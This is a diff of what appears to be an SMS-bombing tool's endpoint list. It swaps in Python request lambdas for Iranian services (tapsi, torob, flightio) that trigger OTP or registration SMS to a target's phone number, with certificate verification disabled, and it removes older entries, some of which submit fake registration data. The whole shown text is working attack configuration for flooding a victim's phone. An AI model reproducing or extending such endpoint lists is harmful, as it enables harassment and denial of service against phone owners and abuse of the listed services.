@@ -1260,40 +1260,45 @@ api.payping.ir
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
 new url:
-zabane python:FARBODxME
-('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
+zabane python:https://github.com/secabuser
 
-        'microele': ('https://www.microele.com/login?back=my-account', {
-            'id_customer': '','back':',my-account',
-            'firstname': '123','lastname':'123',
-            'password': '123456','action':'register',
-            'username':'0' + number,'ajax':'1'
-        }),
-
-        'telketab': ('https://telketab.com/opt_field/check_secret', {
-            'identity': '0' + number,
-            'secret': '',
-            'plugin': 'otp_field_sms_processor',
-            'key': 'otp_field_user_auth_form__otp_sms',
-        }),
-
-('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
-
-        'techsiro': ('https://techsiro.com/send-otp', {
-            'client': 'web','method':'POST','_token':'',
-            'mobile':'0' + number
-        }),
-
-('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
+    'tapsi': lambda num: post(
+        url="https://tap33.me/api/v2/user",
+        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
+        headers=kon,
+        timeout=5,
+        verify=False
+    ),
 
 
-     ('https://eaccount.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
-       
+    'torob': lambda num: get(
+        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
+        headers=kon,
+        timeout=5,
+        verify=False
+    ),
 
- ('https://queenaccessories.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+
+   'flightio_app': lambda num: post(
+        url="https://app.flightio.com/bff/Authentication/CheckUserKey",
+        json={
+            "userKey": num,
+            "userKeyType": 1
+        },
+        headers=kon,
+        timeout=5,
+        verify=False
+    ),
 
 
-('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+   'flightio': lambda num: post(
+        url="https://flightio.com/bff/Authentication/CheckUserKey",
+        json={"userKey": num},
+        headers=kon,
+        timeout=5,
+        verify=False
+    ),
+
 
 
 
